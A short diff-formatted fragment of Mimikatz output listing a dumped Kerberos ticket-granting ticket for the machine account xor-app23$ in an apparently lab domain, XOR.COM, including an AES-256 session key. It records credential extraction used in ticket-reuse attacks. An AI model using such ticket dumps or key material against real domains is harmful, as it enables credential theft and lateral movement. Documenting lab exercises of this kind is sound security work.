+           Start/End/MaxRenew: 3/22/2021 9:59:18 PM ; 3/23/2021 7:59:18 AM ; 3/29/2021 12:14:17 PM
+           Service Name (02) : krbtgt ; XOR.COM ; @ XOR.COM
+           Target Name  (02) : krbtgt ; XOR.COM ; @ XOR.COM
+           Client Name  (01) : xor-app23$ ; @ XOR.COM ( XOR.COM )
+           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             6fe5a2ccce7937e65e5519882b841561dcd9e674fa71352fbba3a8fc5e3164ec
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+
+mimikatz #
